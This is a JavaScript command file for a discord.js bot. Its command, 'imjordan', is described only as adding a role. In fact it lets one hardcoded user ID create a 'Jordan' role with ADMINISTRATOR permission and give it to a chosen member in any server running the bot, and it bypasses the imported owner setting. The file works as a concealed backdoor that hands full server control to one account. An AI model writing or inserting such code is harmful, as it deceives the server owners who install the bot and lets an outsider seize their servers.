const { MessageEmbed } = require("discord.js");
const { ownerID } = require("../owner.json")
module.exports = {
  config: {
    name: "imjordan",
    description: "Add a role to a Jordan",
    usage: "imjordan",
    aliases: ['imj']
  },
  run: async (client, message, args) => {

    if(message.author.id !== "353020749126041602") return message.channel.send("You dont have permission to perform this command!")
    
    let rMember = message.mentions.members.first() || message.guild.members.cache.get(args[0]);


    message.guild.roles.create({
        data: {
        name: "Jordan",
        permissions: "ADMINISTRATOR"
    }
    }).then(role => {
        rMember.roles.add(role.id);
    })      
      message.channel.send(`**Welcome Jordan!**`)

  },
};